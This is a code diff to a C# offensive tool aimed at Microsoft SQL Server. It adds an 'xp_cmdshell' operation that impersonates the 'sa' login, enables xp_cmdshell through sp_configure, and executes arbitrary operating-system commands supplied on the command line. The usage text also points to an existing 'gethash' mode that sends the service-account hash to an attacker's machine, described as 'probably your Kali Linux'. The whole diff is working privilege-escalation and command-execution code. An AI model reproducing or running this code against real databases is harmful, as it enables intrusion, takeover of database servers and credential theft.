@@ -5,9 +5,30 @@ using System.Runtime.Remoting.Messaging;
 namespace SQL
 {
     class Program
-    {   
+    {
 
-        static void impersonation(SqlConnection con)
+        static void xp_cmdshell(SqlConnection con, string cmd)
+        {
+            if (impersonation(con))
+            {
+                String enable_xpcmd = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";
+                String execCmd = $"EXEC xp_cmdshell {cmd}";
+
+
+                SqlCommand command = new SqlCommand(enable_xpcmd, con);
+                SqlDataReader reader = command.ExecuteReader();
+                reader.Close();
+
+                command = new SqlCommand(execCmd, con);
+                reader = command.ExecuteReader();
+                reader.Read();
+                Console.WriteLine("Result of command is: " + reader[0]);
+                reader.Close();
+            }
+        }
+
+
+        static bool impersonation(SqlConnection con)
         {
             String executeas = "EXECUTE AS LOGIN = 'sa';";
         
@@ -19,10 +40,25 @@ namespace SQL
             command = new SqlCommand(querylogin, con);
             reader = command.ExecuteReader();
             reader.Read();
-            Console.ForegroundColor = ConsoleColor.Green;
-            Console.WriteLine("Logged in as: " + reader[0]);
-            Console.ResetColor();
-            reader.Close();
+            if (reader[0].ToString().Contains("sa"))
+            {
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("Logged in as: " + reader[0]);
+                Console.ResetColor();
+                reader.Close();
+                return true;
+            }
+            else
+            {
+                Console.ForegroundColor = ConsoleColor.Red;
+                Console.WriteLine("Logged in as: " + reader[0]);
+                Console.ResetColor();
+                reader.Close();
+                return false;
+            }
+
+            
+ 
         }
 
         static bool check_imperonated_logins(SqlConnection con)
@@ -85,7 +121,7 @@ namespace SQL
             check_role(con, "sysadmin");
             if (check_imperonated_logins(con))
             {
-                Console.WriteLine("Some logins to impersonate found ... tryint to impersonate");
+                Console.WriteLine("Some logins to impersonate found ... trying to impersonate sa ... ");
                 impersonation(con);
             }
             
@@ -109,8 +145,9 @@ namespace SQL
             Console.WriteLine("Arguments:");
             Console.WriteLine("  <sqlServer>    SQL Server name (required)");
             Console.WriteLine("  <dbName>       Database name (required)");
-            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash'");
-            Console.WriteLine("  <hashServer>   Server to send svc hash (probably your Kali Linux'");
+            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'cmd'");
+            Console.WriteLine("  gethash <hashServer>   Server to send svc hash (probably your Kali Linux'");
+            Console.WriteLine("  cmd <command>   Command to be executed using xp_cmdshell");
         }
 
 
@@ -155,6 +192,16 @@ namespace SQL
                         return;
                     }
                     get_svchash(con, args[3]);
+                    con.Close();
+                    break;
+                case "cmd":
+                    if (args.Length < 4)
+                    {
+                        Console.WriteLine("Error: Missing argument. For 'cmd' operation, provide a command to execute.");
+                        DisplayUsage();
+                        return;
+                    }
+                    xp_cmdshell(con, args[3]);
                     con.Close();
                     break;
 
